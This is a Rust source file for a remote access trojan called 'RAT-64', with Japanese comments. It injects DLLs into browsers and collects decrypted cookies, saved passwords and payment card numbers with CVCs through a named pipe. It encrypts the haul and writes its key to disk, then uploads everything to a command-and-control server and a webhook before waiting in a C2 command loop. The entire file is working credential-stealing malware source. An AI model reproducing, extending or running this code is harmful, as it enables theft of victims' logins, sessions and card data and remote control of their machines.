// RAT-64 - 統合システム情報収集ツール
use rmp_serde::encode::to_vec as to_msgpack_vec;
// 未使用インポート削除：rand::RngCore
use rat_64::{
    encrypt_data_with_key, generate_key_pair, load_config_or_default, IntegratedPayload, 
    send_unified_webhook, execute_rat_operations, C2Client
};
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use serde::{Deserialize, Serialize};

#[cfg(windows)]
use rat_64::services::{BrowserInjector, BrowserData};

// DLL IPCデータ構造
#[derive(Serialize, Deserialize)]
struct CookieOut {
    host: String,
    name: String,
    path: String,
    value: String,
    expires: i64,
    secure: bool,
    #[serde(rename = "httpOnly")]
    http_only: bool,
}

#[derive(Serialize, Deserialize)]
struct PasswordOut {
    origin: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize)]
struct PaymentOut {
    name_on_card: String,
    expiration_month: i64,
    expiration_year: i64,
    card_number: String,
    cvc: String,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptData {
    browser_name: String,
    profile_name: String,
    cookies: Vec<CookieOut>,
    passwords: Vec<PasswordOut>,
    payments: Vec<PaymentOut>,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptResult {
    browser_type: String,
    profiles: Vec<ChromeDecryptData>,
    total_cookies: usize,
    total_passwords: usize,
    total_payments: usize,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = load_config_or_default();
    
    if let Err(e) = rat_64::core::config::validate_config(&config) {
        println!("❌ 設定エラー: {}", e);
        return Ok(());
    }

    let mut c2_client = C2Client::new(config.clone());
    
    // ブラウザDLL注入（Windows環境のみ）
    let dll_browser_data = collect_browser_data_via_dll().await;
    
    // データ収集とC2処理
    if let Err(e) = perform_main_data_collection(&config, &mut c2_client, dll_browser_data.as_ref()).await {
        eprintln!("❌ データ収集エラー: {}", e);
        return Ok(());
    }
    
    if config.command_server_enabled {
        println!("🎯 C2待機モードに移行");
        if let Err(e) = c2_client.start_c2_loop().await {
            eprintln!("❌ C2エラー: {}", e);
        }
    } else {
        println!("🎯 実行完了");
    }
    
    Ok(())
}

/// ブラウザDLL注入でデータ収集（Windows専用）
#[cfg(windows)]
async fn collect_browser_data_via_dll() -> Option<BrowserData> {
    // 従来のDLL注入とIPC受信を組み合わせ
    match BrowserInjector::new() {
        Ok(injector) => {
            // IPCサーバーとDLL注入の並行実行
            
            // IPCサーバーをバックグラウンドで開始
            let ipc_handle = tokio::spawn(async {
                receive_ipc_data().await
            });
            
            // 少し待ってからDLL注入を開始
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            // DLL注入を実行
            match injector.inject_all_browsers().await {
                Ok(mut browser_data) => {
                    // IPCデータの受信を待機（タイムアウト付き）
                    match tokio::time::timeout(
                        tokio::time::Duration::from_secs(10),
                        ipc_handle
                    ).await {
                        Ok(Ok(Some(ipc_result))) => {
                            integrate_ipc_data(&mut browser_data, &ipc_result);
                        }
                        Ok(Ok(None)) => {}
                        Ok(Err(_)) => {}
                        Err(_) => {}
                    }
                    
                    Some(browser_data)
                }
                Err(_) => {
                    None
                }
            }
        },
        Err(e) => {
            println!("❌ インジェクタ初期化エラー: {}", e);
            None
        }
    }
}

#[cfg(not(windows))]
async fn collect_browser_data_via_dll() -> Option<()> {
    None
}

/// Windows名前付きパイプサーバーでDLLからIPCデータを受信
#[cfg(windows)]
async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
    use std::ffi::c_void;
    use std::ptr;
    
    // Windows API定義
    #[link(name = "kernel32")]
    extern "system" {
        fn CreateNamedPipeW(
            lpName: *const u16,
            dwOpenMode: u32,
            dwPipeMode: u32,
            nMaxInstances: u32,
            nOutBufferSize: u32,
            nInBufferSize: u32,
            nDefaultTimeOut: u32,
            lpSecurityAttributes: *mut c_void,
        ) -> *mut c_void;
        fn ConnectNamedPipe(hNamedPipe: *mut c_void, lpOverlapped: *mut c_void) -> i32;
        fn ReadFile(
            hFile: *mut c_void,
            lpBuffer: *mut c_void,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(hObject: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }
    
    const PIPE_ACCESS_INBOUND: u32 = 0x00000001;
    const PIPE_TYPE_BYTE: u32 = 0x00000000;
    const PIPE_READMODE_BYTE: u32 = 0x00000000;
    const PIPE_WAIT: u32 = 0x00000000;
    const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
    
    // パイプ名をワイド文字に変換
    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
    
    unsafe {
        let pipe_handle = CreateNamedPipeW(
            pipe_name.as_ptr(),
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            0,
            65536, // 64KB受信バッファ
            0,
            ptr::null_mut(),
        );
        
        if pipe_handle == INVALID_HANDLE_VALUE {
            println!("⚠️ 名前付きパイプの作成に失敗");
            return None;
        }
        
        // DLLからの接続を待機（タイムアウト設定）
        let result = ConnectNamedPipe(pipe_handle, ptr::null_mut());
        if result == 0 {
            let error = GetLastError();
            // ERROR_PIPE_CONNECTED (535) は既に接続済みを意味する
            if error != 535 {
                CloseHandle(pipe_handle);
                return None;
            }
        }
        
        // データ受信
        let mut buffer = vec![0u8; 1024 * 1024]; // 1MB受信バッファ
        let mut bytes_read = 0u32;
        
        if ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            &mut bytes_read,
            ptr::null_mut(),
        ) == 0 {
            println!("⚠️ IPCデータの読み取りに失敗");
            CloseHandle(pipe_handle);
            return None;
        }
        
        CloseHandle(pipe_handle);
        
        if bytes_read > 0 {
            buffer.truncate(bytes_read as usize);
            let json_data = String::from_utf8_lossy(&buffer);
            
            match serde_json::from_str::<ChromeDecryptResult>(&json_data) {
                Ok(result) => {
                    Some(result)
                }
                Err(_) => {
                    None
                }
            }
        } else {
            None
        }
    }
}

/// IPCで受信したDLLデータをBrowserDataに統合
#[cfg(windows)]
fn integrate_ipc_data(browser_data: &mut BrowserData, ipc_result: &ChromeDecryptResult) {
    use rat_64::services::{DllPasswordOut, DllCookieOut, DllPaymentOut};
    
    for profile in &ipc_result.profiles {
        // パスワード統合
        for password in &profile.passwords {
            browser_data.passwords.push(DllPasswordOut {
                origin: format!("[IPC_{}] {}", profile.browser_name, password.origin),
                username: password.username.clone(),
                password: password.password.clone(),
            });
        }
        
        // クッキー統合
        for cookie in &profile.cookies {
            browser_data.cookies.push(DllCookieOut {
                host: format!("[IPC_{}] {}", profile.browser_name, cookie.host),
                name: cookie.name.clone(),
                path: cookie.path.clone(),
                value: cookie.value.clone(),
                expires: cookie.expires,
                secure: cookie.secure,
                http_only: cookie.http_only,
            });
        }
        
        // 支払い情報統合
        for payment in &profile.payments {
            browser_data.payments.push(DllPaymentOut {
                name_on_card: format!("[IPC_{}] {}", profile.browser_name, payment.name_on_card),
                expiration_month: payment.expiration_month,
                expiration_year: payment.expiration_year,
                card_number: payment.card_number.clone(),
                cvc: payment.cvc.clone(),
            });
        }
    }
    

}

/// DLL注入で収集したブラウザデータをメインペイロードに統合
#[cfg(windows)]
fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
    
    // パスワード統合
    for password in &dll_data.passwords {
        payload.auth_data.passwords.push(format!(
            "[DLL_DECRYPTED] {}|{}|{}", 
            password.origin, password.username, password.password
        ));
    }
    
    // クッキー統合
    for cookie in &dll_data.cookies {
        payload.auth_data.passwords.push(format!(
            "[DLL_COOKIE] {}|{}|{}", 
            cookie.host, cookie.name, cookie.value
        ));
    }
    
    // 支払い情報統合
    for payment in &dll_data.payments {
        payload.auth_data.passwords.push(format!(
            "[DLL_PAYMENT] {}|{}|{}|{}", 
            payment.card_number, payment.name_on_card, 
            payment.expiration_month, payment.expiration_year
        ));
    }
    

}

/// メインのデータ収集処理
async fn perform_main_data_collection(
    config: &rat_64::Config, 
    c2_client: &mut C2Client,
    #[cfg(windows)] dll_browser_data: Option<&rat_64::services::BrowserData>,
    #[cfg(not(windows))] _dll_browser_data: Option<&()>,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut payload = IntegratedPayload::create_with_config(&config).await?;
    // 収集データの統合
    
    // DLL注入データ統合
    #[cfg(windows)]
    if let Some(dll_data) = dll_browser_data {
        integrate_dll_browser_data(&mut payload, dll_data);
    }
    
    println!("✅ データ収集完了: {}件", payload.auth_data.passwords.len());
    
    // データ暗号化・保存・送信
    process_and_save_data(payload, config, c2_client).await?;
    
    // 実行結果サマリー
    match execute_rat_operations(&config).await {
        Ok(_) => {},
        Err(e) => println!("❌ サマリー生成エラー: {}", e),
    }
    
    println!("🎯 RAT-64 メイン処理完了！");
    Ok(())
}

/// データの暗号化・保存・送信処理
async fn process_and_save_data(
    mut payload: rat_64::IntegratedPayload, 
    config: &rat_64::Config, 
    c2_client: &mut C2Client
) -> Result<(), Box<dyn std::error::Error>> {
    let serialized = to_msgpack_vec(&payload)?;
    let (key, nonce) = generate_key_pair();
    let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
    payload.set_encryption_info(&key, &nonce);
    
    // キー/ナンス情報をファイルに保存
    let key_b64 = STANDARD_NO_PAD.encode(&key);
    let nonce_b64 = STANDARD_NO_PAD.encode(&nonce);
    std::fs::write("key.txt", &key_b64)?;
    std::fs::write("nonce.txt", &nonce_b64)?;
    
    // C2アップロード
    if config.command_server_enabled {
        match c2_client.upload_collected_data(&payload).await {
            Ok(()) => println!("📤 Data uploaded successfully"),
            Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
        }
    }
    
    // ファイル保存
    std::fs::write("data.dat", &encrypted)?;
    
    // Webhook送信
    if config.webhook_enabled {
        match send_unified_webhook(&payload, &config).await {
            Ok(()) => println!("✅ Webhook送信成功"),
            Err(e) => println!("❌ Webhook送信失敗: {}", e),
        }
    }
    
    Ok(())
}

// 非Windows環境用のダミー実装
#[cfg(not(windows))]
fn is_admin() -> bool {
    false // Unix系では簡単にはチェックできないため false を返す
}